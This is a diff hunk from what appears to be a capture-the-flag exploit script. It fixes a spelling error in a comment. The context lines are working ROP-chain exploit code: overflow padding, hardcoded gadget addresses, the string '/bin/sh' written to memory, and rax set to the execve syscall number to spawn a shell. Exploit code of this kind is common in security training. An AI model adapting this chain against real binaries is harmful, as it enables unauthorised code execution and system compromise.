@@ -8,7 +8,7 @@ syscall=p64(0x00000000004025ea)
 mov_qword_ptr_rdi_rax_ret=p64(0x000000000043f04b) 
 
 #rdx=0
-payload=b"A"*31+b"\x00"+b"A"*24  #offsett
+payload=b"A"*31+b"\x00"+b"A"*24  #offset
 payload+=pop_rax_ret+p64(0x0068732f6e69622f)
 payload+=mov_qword_ptr_rdi_rax_ret #rdi pointing to --> /bin/sh
 payload+=pop_rax_ret+p64(0x3b) #sysvalue rax=59
